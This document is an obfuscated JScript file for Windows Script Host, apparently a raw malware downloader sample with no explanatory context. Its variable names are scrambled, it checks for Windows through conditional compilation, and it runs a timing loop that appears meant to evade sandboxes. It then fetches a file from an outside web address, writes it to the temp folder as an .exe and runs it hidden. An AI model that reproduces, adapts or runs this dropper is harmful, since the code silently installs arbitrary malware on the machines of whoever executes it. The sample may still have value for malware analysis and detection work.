var _GX = false;
var _A = "CreateObject";
var _W0 = function _LT() {return WScript[_A]("WScript"+".Shell");}(), _ND = 11;
var _NW = "MSXML2.XMLHTTP";
var _SK = 2123213;
var _P = 0;
function _D(_QG){_W0["Run"](_QG, _P, _P);};
function _N(){return _NW + "";};
function _VC(_C, _J){_P = _P * 1; return _C - _J;};
function _K(){return _A;};
/*@cc_on
  @if (@_win32 || @_win64)
    _GX = true;
  @end
@*/
if (_GX)
{
var _T = "";
function _V(){return 22;};
var _I = 0; var _PJ = 0;
function _WZ()
{
var _N1 = new this["Date"]();
var _V0 = _N1["getUTCMilliseconds"]();
WScript["Sleep"](_V());
var _N1 = new this["Date"]();
var _G = _N1["getUTCMilliseconds"]();
WScript["Sleep"](_V());
var _N1 = new this["Date"]();
var _M0 = _N1["getUTCMilliseconds"]();
var _I = "_M";
_I = _VC(_G, _V0);
var _PJ = "_P0";
_PJ = _VC(_M0, _G);
_T = "open";
return _VC(_I, _PJ);
}
var _GR = false;
var _MH = false;
for (var _XN = _P; _XN < _V() * 1; _XN++){if (_WZ() != _P){
_GR = true; 
_PJ = "31" + 11 * _I + _PJ; 
_MH = true; 
break;
}}
function _IU() {return ((_GR == true) && (_GR == _MH)) ? 1 : _P;};
if (_GR && _IU() && _MH){
function _GG() {return _W0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "LLulsDEnLvw.ex" + "e";};
 _Q = _N();
 _A0 = WScript[_A](_Q);
 var _QH = 1;
 while (_QH){
try {
	if (_QH == 1)
	{
		_A0[_T]("GET", "http://susiewest.com/u2w7q", false);
		_A0["send"]();
		_O = "Sleep";
	}
	WScript[_O](_V() + 120); 
	if (_A0["readystate"] < 2 * 2) continue;
	_QH = _P;
	function _JW(_JA) {var _W = (1, 2, 3, 4, 5, _JA); return _W;};
	_JK = WScript[_K()]("ADODB.Stream");
	_Q = _JK;
	_Q[_T]();
	_Q["type"] = _JW(1);
	_Q["write"](_A0["ResponseBody"]);
	_JK["position"] = _JW(_P);
	_Q["Save" + "ToFile"](_GG(), 2);
	_JK["cl"+"ose"]();
	_N0 = _GG();
	_D(_N0);
} catch(_WZ0){};
}
}
}

